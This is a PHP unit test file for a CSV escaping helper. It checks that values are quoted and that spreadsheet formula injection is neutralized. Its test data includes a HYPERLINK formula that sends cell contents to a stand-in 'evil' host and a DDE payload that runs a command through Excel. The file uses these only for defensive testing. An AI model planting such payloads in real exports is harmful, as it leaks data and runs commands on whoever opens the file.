<?php

namespace Tests\Unit\Support;

use App\Support\Csv;
use PHPUnit\Framework\TestCase;

class CsvTest extends TestCase
{
    public function test_empty_and_null_become_empty(): void
    {
        $this->assertSame('', Csv::escape(null));
        $this->assertSame('', Csv::escape(''));
    }

    public function test_plain_value_unchanged(): void
    {
        $this->assertSame('hello', Csv::escape('hello'));
        $this->assertSame('Jane Doe', Csv::escape('Jane Doe'));
    }

    public function test_comma_quote_newline_are_quoted(): void
    {
        $this->assertSame('"a,b"', Csv::escape('a,b'));
        $this->assertSame('"a""b"', Csv::escape('a"b'));
        $this->assertSame("\"a\nb\"", Csv::escape("a\nb"));
    }

    /** @dataProvider formulaPrefixes */
    public function test_formula_prefixes_are_neutralized(string $payload): void
    {
        $escaped = Csv::escape($payload);

        // The escaped cell must begin either with a bare apostrophe (no special chars)
        // or with the quoted-form opener "'  (the cell is also quoted because it contains
        // commas, quotes, CR or LF). Either way Excel/Sheets render it as literal text.
        $beginsWithApos       = str_starts_with($escaped, "'");
        $beginsWithQuotedApos = str_starts_with($escaped, "\"'");

        $this->assertTrue(
            $beginsWithApos || $beginsWithQuotedApos,
            "Payload starting with formula trigger should be neutralized with leading apostrophe: {$payload} -> {$escaped}"
        );
    }

    public static function formulaPrefixes(): array
    {
        return [
            'equals_plain' => ['=SUM(A1:A5)'],
            'equals_link'  => ['=HYPERLINK("https://evil/?c="&A1, "click")'],
            'plus'         => ['+1+2'],
            'minus'        => ['-2+3'],
            'at'           => ['@SUM(1)'],
            'tab'          => ["\tevil"],
            'cr'           => ["\revil"],
            'dde_classic'  => ['=cmd|\'/c calc\'!A0'],
        ];
    }

    public function test_formula_with_comma_is_quoted_and_prefixed(): void
    {
        $r = Csv::escape('=HYPERLINK("https://evil/?c="&A1, "click")');
        $this->assertStringStartsWith("\"'=", $r);
    }

    public function test_row_terminates_with_crlf(): void
    {
        $this->assertSame("a,b,c\r\n", Csv::row(['a','b','c']));
    }

    public function test_row_escapes_each_cell(): void
    {
        $this->assertSame("'=foo,\"bar,baz\"\r\n", Csv::row(['=foo','bar,baz']));
    }
}
